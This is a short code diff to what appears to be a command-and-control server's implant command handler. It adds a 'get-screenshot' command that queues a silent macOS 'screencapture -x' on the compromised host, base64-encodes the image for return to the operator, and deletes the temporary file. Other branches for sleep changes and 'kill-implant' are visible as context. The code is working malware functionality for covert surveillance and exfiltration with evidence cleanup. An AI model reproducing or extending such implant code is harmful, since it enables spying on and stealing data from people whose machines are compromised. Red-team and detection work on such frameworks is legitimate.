@@ -365,6 +365,10 @@ def runcommand(command, randomuri):
       update_sleep(command, randomuri)
       new_task(sleep, randomuri)
 
+    elif 'get-screenshot' in command.lower():
+      taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
+      new_task(taskcmd, randomuri)
+
     elif "kill-implant" in command.lower():
       pid = get_pid(randomuri)
       new_task("kill -9 %s" % pid,randomuri)
